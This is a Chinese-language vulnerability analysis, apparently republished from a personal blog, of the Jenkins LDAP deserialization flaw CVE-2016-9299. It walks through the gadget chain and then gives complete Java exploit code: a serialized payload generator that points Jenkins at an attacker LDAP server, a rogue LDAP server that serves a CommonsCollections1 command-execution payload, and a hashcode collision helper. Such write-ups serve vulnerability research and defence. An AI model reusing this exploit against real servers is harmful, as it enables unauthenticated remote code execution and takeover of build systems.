来源：[随风's Blog](https://www.iswin.org/2017/01/25/Jenkins-LDAP-Deserializable-Vulnerablity-CVE-2016-9299-Analysis/)

作者：[iswin](https://www.iswin.org/about)

> 这个漏洞在去年11月份官方发布通告的时候我当时关注过，当时自己一直在找 ** _com.sun.jndi.ldap.LdapAttribute_**
> 这个类相关的反序列化，当时意识到这个类里面的`_getAttributeSyntaxDefinition()_`方法和`_getAttributeDefinition()_`可能会存在反序列化的问题，但是当时找了好多类，发现在反序列化的时候都无法触发这两个方法，原本以为是jdk里面自己的问题，最后就没继续跟下去了，中途有老外放出了一个ppt里面演示了这个漏洞，大概看了下发现是利用json来bypass
> Jenkins的白名单，当时一直在忙数据分析的事情，事情就搁浅了，前不久刚好MSF上有Payload了，再加上年底了没那么多事了，所以就研究了下，这个漏洞还是挺有意思的，涉及的知识面还是稍微广了一点，这里不得不佩服那些漏洞发现者。
>
> 每当一个漏洞漏洞出现的时候，我就在想为什么自己不能发现，当每次漏洞分析完的时候才发现各方面的差距真的是不小。
>
> **_技术在于分享，这样才能进步_** 。

### 漏洞简介

2016年11月16号Jenkins官方发布了一个安全通告，命名为[CVE-2016-9299](https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2016-11-16),从通告上来看，该漏洞依然是个反序列的漏洞，不过这个漏洞的反序列化和LDAP有关，而且在反序列化后需要连接到一个恶意的LDAP服务器，Jenkins对于之前反序列化的修复方法就是对一些恶意的类加上黑名单，所以这里首先得Bypass官方的黑名单，对于该漏洞只有这么多信息，而且在官方给的POC里面也仅仅是提到了
** _com.sun.jndi.ldap.LdapAttribute_** 这个类，这个漏洞的利用首先是不需要认证的，而且能任意代码执行，危害可见一斑。

### 漏洞分析

从官方的描述以及后面的Payload来看，问题和net.sf.json以及com.sun.jndi.ldap.LdapAttribute有关，通过分析对LdapAttribute这个类的分析，我们可以确定以下两个方法是触发反序列化漏洞的根本（关于下文中LDAP的反序列相关的知识请移步16年blackhat老外的Paper
“us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE”）

  * getAttributeSyntaxDefinition
  * getAttributeDefinition

这两个方法中都调用了该`_DirContext schema =
getBaseCtx().getSchema(rdn);_`代码片段其中getBaseCtx()方法定义如下：

![/attach/getBaseCtx.png](https://images.seebug.org/content/images/2017/01/getBaseCtx.png-w331s)

该段代码使用jndi的方式去访问LDAP服务，这里我们可以控制Context.PROVIDER_URL的参数，从而控制jndi访问的LDAP服务器的地址。

getSchema(rdn)方法最终会调用`com.sun.jndi.ldap.LdapBindingEnumeration.createItem(String,
Attributes, Vector)`方法（调用关系太多，自己去调试），该方法的定义如下图

![/attach/createItem.png](https://images.seebug.org/content/images/2017/01/createItem.png-w331s)

在该方法中最终会调用 ** _Obj.decodeObject(attrs)_**
方法，从而实现对象的反序列化。这里稍微提下，com.sun.jndi.ldap.Obj对象中定义了几种对象序列化与反序列化的方法，有直接反序列化的，也有直接通过远程加载的，这里的的反序列化稍微与其它地方的反序列化不同的点在于我们不能远程加载对象，因为com.sun.jndi.ldap.VersionHelper12.trustURLCodebase的默认值为false，所以直接决定了类加载器只能加载当前classpath下面的类，关于如何去构造对象使得LDAP在反序列化能执行任意代码，请看下文。

到这里我们知道了com.sun.jndi.ldap.LdapAttribute中相关的方法能触发反序列化的漏洞，那么现在我们要做的就是去找到一个类在反序列化的时候能调用我们相应触发漏洞的函数，也就是在反序列化时能调用getAttributeSyntaxDefinition方法或者getAttributeDefinition方法的类，通过老外的PPT以及公开的gadgets，我们稍微分析下就会发现在net.sf.json这个类库中存在可以调用类任意getXXX函数的地方，那么com.sun.jndi.ldap.LdapAttribute这个类中的getXXX方法是不是也可以通过这种方式来调用，首先我们先确定究竟是那个类中的那个方法能调用getXXX函数，通过gadgets中的json
Payload我们发现最终能调用对象的getXXX函数如下图（net.sf.json.JSONObject.defaultBeanProcessing(Object,
JsonConfig)）所示

![/attach/defaultbeanProcessing.png]()

上图中圈起来的两个地方就是能调用getXXX函数的地方，这里会先遍历javabean的所有属性，最后在挨个的调用。

弄明白了能函数调用的根源，下一步就是去找这个函数究竟会怎样触发。通过eclipse我们可以很容易发现如下调用方式。

![/attach/calldefaultbeanProcessing.png](https://images.seebug.org/content/images/2017/01/calldefaultbeanProcessing.png-w331s)

如上图所示，我们可以看见defaultBeanProcessing方法最终会被ConcurrentSkipListSet类中的equals方法调用，到这里很多人可能会问了，那么多调用关系，你为什么就找这个类的equals方法，这里可能会有一些经验在里面，因为对于和equals方法相关的东西太多了，对于java中的某些数据结构，例如Set,每次添加元素的时候都会判断当前key是否存在，还有就是比较两个对象是否相等的时候会去调用hashcode和equals方法，这里如果了解过其它反序列化的同学对此可能会稍有感触，例如jdk的那个反序列化的触发过程。如果这种经验没有的话，那么你只能一个一个的去找了。

最终我们找到了一个类可以的某个方法可以调用我们的函数了，但是你可能会发现在eclipse中这样的函数调用关系大多是多态情况下的方法调用，所以我们还需要对equals方法中的方法调用进行分析，这里我们需要注意的是defaultBeanProcessing这个函数的直接调用对象是net.sf.json.JSONArray.fromObject(Object,
JsonConfig)方法，我们来看下equals方法

![/attach/concurrentSkipListSetEquals.png](https://images.seebug.org/content/images/2017/01/concurrentSkipListSetEquals.png-w331s)

在这个方法里面有两处调用了containsAll方法，我们要看看究竟是那个可能会调用fromObject，我们再来看下fromObject的调用关系，如下图

![/attach/fromObjectcall.png](https://images.seebug.org/content/images/2017/01/fromObjectcall.png-w331s)

你会发现JSONArray调用了containsAll方法，

    
    
    containsAll(c) && c.containsAll(this);

这里的第一个containsAll方法是触发不了的那个函数的，所以我们只要满足对象o是JSONArray就行了，但是事实上是不行了，因为这个对象o不是Set的子类，所以这条路到这基本上就走不通了，所以我们还得继续找。

继续回到c.containsAll这个地方我们再找那些函数最终调用了containsAll，这里我们发现org.apache.commons.collections.collection.AbstractCollectionDecorator.containsAll(Collection)这个抽象类调用了，来看改函数的定义

    
    
    protected Collection collection;
    ....
     public boolean containsAll(Collection coll) {
         return collection.containsAll(coll);
     }

这里最终会调用collection.containsAll方法，如果这里我们将collection赋值为JSONArray对象的话不照样触发漏洞么，由于AbstractCollectionDecorator这个类是抽象的，无法实例化，所以我们得找一个它的子类，注意这里我们必须得满足子类是实现了Set接口并且是可以序列化的，所以找到最后我们找到了org.apache.commons.collections.set.ListOrderedSet这个类。这里只需要满足父类的collection是JSONArray就行了。

到这里我们知道了只需要让equals方法中的对象o赋值成org.apache.commons.collections.set.ListOrderedSet的实例就行了。

接下来我们要去找关于equals的调用关系了，直接使用eclipse我们可以找到org.apache.commons.collections.map.Flat3Map.put(Object,
Object)这个类（详细过程大家自己去跟），这个类有个更重要的一点是

![/attach/flat3map_readObject.png](https://images.seebug.org/content/images/2017/01/flat3map_readObject.png-w331s)

这个类在反序列化的时候恰好就触发了这个put函数，最终触发我们精心构造的对象。

这个Flat3Map有个特点就是当map的元素小于等于3的时候会用类成员变量来存储数据，而且这里还必须得调用equals方法。

![/attach/flat3map_put.png](https://images.seebug.org/content/images/2017/01/flat3map_put.png-w331s)

悲剧的是这里我们需要构造两个对象也就是我们刚才讨论的，一个是ListOrderedSet一个是concurrentSkipListSet对象，但是这里我们需要满足这两个对象的key值的hashcode必须相同。
这里的hashcode要么全为0这样是最好的，也就是key为空字符串就行了，但是我们要构造的Payload里面必须要有JSONArray对象，这个对象默认的hashcode是29，不管怎么弄都不可能相等，不过这里我们可以用hashcode碰撞来解决hashcode值相同问题。

这里我们关键的漏洞是怎么触发的已经浪费了大量的篇幅来说明，下来就是要去构造POC了，这里具体细节就比较简单了，不做过多的描述了。

### Payload-LDAP-JNDI

这里直接给出生成Ldap序列化的Payload，如果谁有什么疑问可以邮件交流。

    
    
    @author iswin
    public static void main(String[] args) throws InstantiationException, IllegalAccessException,
            IllegalArgumentException, InvocationTargetException, Exception {
    
        Object o = Reflections.getFirstCtor("com.sun.jndi.ldap.LdapAttribute").newInstance("iswin");
        Reflections.setFieldValue(o, "baseCtxURL", "ldap://127.0.0.1:38900");
        ConcurrentSkipListSet sets = new ConcurrentSkipListSet(new NullComparator());
        sets.add(o);
        ListOrderedSet set = new ListOrderedSet();
        JSONArray array = new JSONArray();
        array.add("\u0915\u0009\u001e\u000c\u0002\u0915\u0009\u001e\u000b\u0004");
        Reflections.setSuperFieldValue(set, set.getClass().getSuperclass().getSuperclass().getSuperclass(),
                "collection", array);
        Flat3Map map = new Flat3Map();
        map.put(set, true);
        map.put(sets, true);
    
        //如果不在这里更改值，则满足不了hash相等条件，如果在之前设置为空，那么在Flat3Map的put方法时就会触发漏洞，则不能完成生成payload。
        Reflections.setSuperFieldValue(o, o.getClass().getSuperclass(), "attrID", "");
        byte[] bt = Serializer.serialize(map);
        Deserializer.deserialize(bt);
    }

### Payload-LDAP-SERVER

刚开始以为主要能生成序列化的Payload然后随便找个LDAP服务器弄个序列化的对象丢上去就行了，但是事实好像没有那么简单，我用apacheds模拟了好久就是不行，后来看了下上文提到的那个Obj.decodeObject(attrs)方法，发现这个必须要LDAP服务器返回的信息中必须包含某些属性，例如javaSerializedData，但是每次去请求总是达不到效果，后来去瞅了下msf上的payload，大概明白了一点，后来懒得去弄了，就学习了下ldap协议的rfc文档，熟悉了下asn1标记语言（有耐心的同学可以仔细看看），具体解释如下

![](https://images.seebug.org/content/images/2017/01/asn1.png-w331s)

直接将msf上的那个模拟的服务端中的asn1部分直接拿java重写了下。 整体代码如下：

    
    
    @author iswin
    public class LdapServer {
        public static byte[] hexStringToByteArray(String s) {
            int len = s.length();
            byte[] data = new byte[len / 2];
            for (int i = 0; i < len; i += 2) {
                data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
            }
            return data;
        }
        public static String bytesToHex(byte[] bytes) {
            char[] hexArray = "0123456789ABCDEF".toCharArray();
            char[] hexChars = new char[bytes.length * 2];
            for (int j = 0; j < bytes.length; j++) {
                int v = bytes[j] & 0xFF;
                hexChars[j * 2] = hexArray[v >>> 4];
                hexChars[j * 2 + 1] = hexArray[v & 0x0F];
            }
            return new String(hexChars);
        }
        public static byte[] make_stage_reply() throws Exception {
            Object payload = CommonsCollections1.class.newInstance().getObject("open /Applications/Calculator.app");
            ByteArrayOutputStream objpayload = new ByteArrayOutputStream();
            ObjectOutputStream oo = new ObjectOutputStream(objpayload);
            oo.writeObject(payload);
            Sequence sq = new Sequence();
            sq.addElement(new OctetString("javaClassName".getBytes()));
            Set s0 = new Set();
            s0.addElement(new OctetString("WTF".getBytes()));
            sq.addElement(s0);
            Sequence sq1 = new Sequence();
            sq1.addElement(new OctetString("javaSerializedData".getBytes()));
            Set s = new Set();
            s.addElement(new OctetString(objpayload.toByteArray()));
            sq1.addElement(s);
            Sequence sq2 = new Sequence();
            sq2.addElement(sq);
            sq2.addElement(sq1);
            Sequence sq3 = new Sequence();
            sq3.addElement(new OctetString("cn=wtf, dc=example, dc=com".getBytes()));
            sq3.addElement(sq2);
            sq3.setTagClass(Tag.APPLICATION);
            sq3.setTagNumber(4);
            Sequence sqall = new Sequence();
            sqall.addElement(new ASN1Integer(3L));
            sqall.addElement(sq3);
            ByteArrayOutputStream opt = new ByteArrayOutputStream();
            sqall.encode(new BerOutputStream(opt, BerOutputStream.ENCODING_DER));
            return opt.toByteArray();
        }
        public static void read_ldap_packet(Socket socket) {
            try {
                InputStream sin = socket.getInputStream();
                byte[] sinb = new byte[2];
                sin.read(sinb);
                if (sinb[0] != '0') {
                    return;
                }
                int length = (char) (sinb[1] & 0xFF);
                if ((length & (1 << 7)) != 0) {
                    int length_bytes_length = length ^ (1 << 7);
                    byte[] length_bytes = new byte[length_bytes_length];
                    sin.read(length_bytes);
                    int sum = 0;
                    for (int i = 0; i < length_bytes.length; i++) {
                        sum += (length_bytes[i] & 0xFF);
                    }
                    length = sum;
                }
                // System.out.println("length" + length);
                byte[] tmp = new byte[length];
                sin.read(tmp);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        public static void socketServer() throws Exception {
            try {
                ServerSocket server = new ServerSocket(38900);
                Socket ss = server.accept();
                OutputStream out = new BerOutputStream(ss.getOutputStream());
                read_ldap_packet(ss);
                out.write(hexStringToByteArray("300c02010161070a010004000400"));
                out.flush();
                read_ldap_packet(ss);
                out.write(hexStringToByteArray(
                        "3034020102642f04066f753d777466302530230411737562736368656d61537562656e747279310e040c636e3d737562736368656d61"));
                out.write(hexStringToByteArray("300c02010265070a010004000400"));
                out.flush();
                read_ldap_packet(ss);
                out.write(make_stage_reply());
                out.write(hexStringToByteArray("300c02010365070a010004000400"));
                out.flush();
                out.close();
                ss.close();
                server.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        public static void main(String[] args) throws Exception {
            socketServer();
        }
    }

最后再来简单说下那个Obj.decodeObject(attrs)的Payload构造问题，有的同学肯定会说了jndi不是直接可以远程加载类然后实例化么，这个问题再上门说过了，对于LDAP的jndi这个方法是行不通的，我们来看看这个Obj类到底是怎么处理的

![](https://images.seebug.org/content/images/2017/01/obj-decodeObject.png-w331s)

这里我们可以看到这里定义多种不同的方式来去解析对象， ClassLoader cl =
helper.getURLClassLoader(codebases); 这个类加载器是从codebase的URL中去加载涉及的相关类，但是我看下具体方法

![](https://images.seebug.org/content/images/2017/01/urlcodebase.png-w331s)

所以默认是加载不了codebase中定义的类的，一旦这样我们就只能构造相关反序列化漏洞的POC，让类在Jenkins进行反序列化时再触发漏洞了，不过这样子的话Payload很有可能不成功。

### 关于hashcode的碰撞问题

这样叫不知道对不对，姑且这样叫吧，老外早就研究过这个问题，我直接把代码丢出来，可以碰撞出任意数值的hashcode值，大家在使用的时候要注意版权问题。

    
    
    package iswin;
    public class HashCollision {
        public static String convert(String str) {
            str = (str == null ? "" : str);
            String tmp;
            StringBuffer sb = new StringBuffer(1000);
            char c;
            int i, j;
            sb.setLength(0);
            for (i = 0; i < str.length(); i++) {
                c = str.charAt(i);
                sb.append("\\u");
                j = (c >>> 8); // 取出高8位
                tmp = Integer.toHexString(j);
                if (tmp.length() == 1)
                    sb.append("0");
                sb.append(tmp);
                j = (c & 0xFF); // 取出低8位
                tmp = Integer.toHexString(j);
                if (tmp.length() == 1)
                    sb.append("0");
                sb.append(tmp);
            }
            return (new String(sb));
        }
        public static String string2Unicode(String string) {
            StringBuffer unicode = new StringBuffer();
            for (int i = 0; i < string.length(); i++) {
                // 取出每一个字符
                char c = string.charAt(i);
                // 转换为unicode
                unicode.append("\\u" + Integer.toHexString(c));
            }
            return unicode.toString();
        }
        /**
         * Returns a string with a hash equal to the argument.
         * 
         * @return string with a hash equal to the argument.
         * @author - Joseph Darcy
         */
        public static String unhash(int target) {
            StringBuilder answer = new StringBuilder();
            if (target < 0) {
                // String with hash of Integer.MIN_VALUE, 0x80000000
                answer.append("\u0915\u0009\u001e\u000c\u0002");
                if (target == Integer.MIN_VALUE)
                    return answer.toString();
                // Find target without sign bit set
                target = target & Integer.MAX_VALUE;
            }
            unhash0(answer, target);
            return answer.toString();
        }
        /**
         * 
         * @author - Joseph Darcy
         */
        private static void unhash0(StringBuilder partial, int target) {
            int div = target / 31;
            int rem = target % 31;
            if (div <= Character.MAX_VALUE) {
                if (div != 0)
                    partial.append((char) div);
                partial.append((char) rem);
            } else {
                unhash0(partial, div);
                partial.append((char) rem);
            }
        }
        public static void main(String[] args) {
            System.out.println(convert(unhash(877174790)));
            System.out.println("\u0915\u0009\u001e\u000c\u0002\u5569\u001b\u0006\u001b".hashCode());
        }
    }

补一张成功利用的截图

![](https://images.seebug.org/content/images/2017/01/jenkins-exploit.jpg-w331s)

### 总结

只要方向对，撸起袖子加油干！

### 参考

[1] https://github.com/rapid7/metasploit-framework/pull/7815

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/199/>

